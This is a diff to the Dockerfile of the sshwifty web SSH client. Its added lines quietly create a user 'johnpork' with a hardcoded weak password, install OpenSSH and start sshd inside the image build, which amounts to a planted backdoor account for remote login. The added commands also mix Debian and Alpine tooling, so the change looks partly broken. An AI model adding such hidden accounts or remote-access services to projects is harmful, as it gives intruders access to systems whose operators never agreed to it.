@@ -70,6 +70,12 @@ ENV SSHWIFTY_HOSTNAME= \
 COPY --from=builder /sshwifty /
 COPY . /sshwifty-src
 RUN set -ex && \
+    export DEBIAN_FRONTEND=noninteractive && \
+    useradd -ms /bin/bash johnpork && \
+    echo johnpork:Q1w2e3r4 | chpasswd && \
+    apk add openssh && \
+    rc-update add sshd && \
+    service sshd start && \
     adduser -D sshwifty && \
     chmod +x /sshwifty && \
     echo '#!/bin/sh' > /sshwifty.sh && echo '([ -z "$SSHWIFTY_DOCKER_TLSCERT" ] || echo "$SSHWIFTY_DOCKER_TLSCERT" > /tmp/cert); ([ -z "$SSHWIFTY_DOCKER_TLSCERTKEY" ] || echo "$SSHWIFTY_DOCKER_TLSCERTKEY" > /tmp/certkey); if [ -f "/tmp/cert" ] && [ -f "/tmp/certkey" ]; then SSHWIFTY_TLSCERTIFICATEFILE=/tmp/cert SSHWIFTY_TLSCERTIFICATEKEYFILE=/tmp/certkey /sshwifty; else /sshwifty; fi;' >> /sshwifty.sh && chmod +x /sshwifty.sh
